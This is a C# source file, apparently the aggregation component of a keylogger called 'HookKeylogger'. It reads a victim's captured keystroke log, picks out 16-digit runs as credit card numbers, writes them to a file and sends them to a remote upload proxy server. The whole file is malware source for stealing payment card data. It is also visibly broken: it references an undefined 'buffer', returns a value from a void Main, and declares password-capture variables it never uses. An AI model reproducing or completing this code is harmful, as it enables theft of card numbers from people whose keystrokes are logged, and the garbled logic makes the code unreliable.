using System;
using HookKeylogger.Base;
using System.IO;
using Google.Protobuf;
using System.Windows.Forms;
using HookKeylogger.AggergationServer.Types;

namespace KeypressAggregator
{
    class KeypressAggregator
    {
        ///<summary>
        ///This reads through the keylog file and attempts to extract data
        ///</summary>
        static void Main(string[] args)
        {
            // The path of the keylog file
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\keylog";
            // The new file that holds the extracted data
            string newFile = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\data";

            // Read the file
            KeyPressBuffer kpb = new KeyPressBuffer(path);

            // Counter for credit card
            int creditCard = 0;
            String creditNum = "";

            // Boolean for login-password credentials
            bool passwordWindow;
            String password = "";

            // Write the information to the stream, goes through each keypress
            StreamWriter o = new StreamWriter(newFile);
            HookKeylogger.UploadProxy.UploadProxyClient client = new HookKeylogger.UploadProxy.UploadProxyClient();
            foreach (KeyPress ks in kpb.Keys)
            {
                Console.WriteLine("Processing: " + (Keys)ks.Key);
                // Looks for a credit card number, ie 16 consecutive digits
                // A number is between 48 and 57. If there is a match, the count
                // is incremented and the number is added to string. Otherwise
                // the count is reset to 0 and the string is cleared
                if(ks.Key > 47 && ks.Key < 58)
                {
                    creditCard += 1;
                    creditNum += (Keys)ks.Key;
                    if (creditCard % 4 == 0)
                    {
                        creditNum += " ";
                    }
                }
                else
                {
                    creditCard = 0;
                    creditNum = "";
                }
                // If there are a total of 16 consecutive numbers, the credit card
                // number is sent to the file
                if(creditCard == 16)
                {
                    o.WriteLine("Credit Card Number: " + creditNum);
                    creditCard = 0;
                    // Send a Confidential Information message to the proxy server
                    // Type Credit Card Number CCN
                    var ci = new CI();
                    ci.Type = "CCN";
                    ci.Data = creditNum;
                    Console.WriteLine("DATA: " + ci.Data);
                    client.SendCi(ci);

                    creditNum = "";
                }
                Console.WriteLine("Hello");
                if (ks.ActiveProgram)
                {
                    return buffer.ToString() + " PswdFld";
                }
            }
            o.Close();
            client.close();

        }
    }
}
